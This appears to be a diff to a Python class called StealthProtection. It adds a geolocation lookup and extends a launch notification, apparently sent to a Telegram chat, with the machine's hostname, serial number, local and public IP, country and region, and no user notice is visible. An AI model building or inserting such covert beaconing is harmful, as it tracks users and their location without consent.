@@ -18,7 +18,7 @@ class StealthProtection:
         self.running = True
         self.last_update_id = 0
 
-    def get_ip(self):
+    def get_local_ip(self):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
@@ -28,15 +28,34 @@ class StealthProtection:
         except:
             return "127.0.0.1"
 
+    def get_geo_info(self):
+        try:
+            resp = requests.get("http://ip-api.com/json", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    "public_ip": data.get("query", "Unknown"),
+                    "country": data.get("country", "Unknown"),
+                    "region": data.get("regionName", "Unknown"),
+                    "city": data.get("city", "Unknown")
+                }
+        except: pass
+        return {"public_ip": "Unknown", "country": "Unknown", "region": "Unknown", "city": "Unknown"}
+
     def send_notification(self, status):
         if not self.token or not self.chat_id: return
-        ip = self.get_ip()
+
+        local_ip = self.get_local_ip()
+        geo = self.get_geo_info()
         hostname = socket.gethostname()
         date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
         msg = (f"🚀 Программа запущена\n"
                f"🔢 Серийный номер: {self.serial}\n"
                f"💻 Компьютер: {hostname}\n"
-               f"🌐 IP: {ip}\n"
+               f"🌐 IP (Локальный): {local_ip}\n"
+               f"🌍 IP (Публичный): {geo['public_ip']}\n"
+               f"📍 Место: {geo['country']}, {geo['region']}\n"
                f"📅 Дата: {date}\n"
                f"📊 Статус: {status}")
         try:
